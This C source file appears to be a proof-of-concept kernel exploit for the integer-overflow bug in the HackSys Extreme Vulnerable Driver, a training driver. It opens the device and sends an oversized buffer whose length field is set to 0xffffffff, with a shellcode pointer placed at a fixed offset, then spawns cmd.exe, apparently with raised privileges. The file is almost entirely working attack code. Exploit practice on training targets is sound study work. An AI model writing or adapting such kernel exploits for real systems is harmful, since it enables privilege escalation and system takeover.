#include<stdio.h>
#include<Windows.h>

#include "x86-header.h"

# pragma warning(disable:6385)

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_INTEGER_OVERFLOW                              IOCTL(0x809)


int main()
{
	int NTStatus = 0;
	WORD recvbuf;

	puts("[+] Start...");
	HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		puts("Failed to Open Device");
		return 0;
	}

	puts("[+] Prepare Data...");
	CHAR buf[0x830];
	memset(buf, 'A', 0x830);

	*(PDWORD)(buf + 0x824) = (DWORD)ShellCode;
	*(PDWORD)(buf + 0x828) = 0xBAD0B0B0;

	puts("[+] Trigger vul");
	DeviceIoControl(hDevice, HEVD_IOCTL_INTEGER_OVERFLOW, (PULONG)buf, (DWORD)0xffffffff, NULL, 0, &recvbuf, NULL);

	puts("cmd.exe...");
	CreateCmd();

	return 0;
}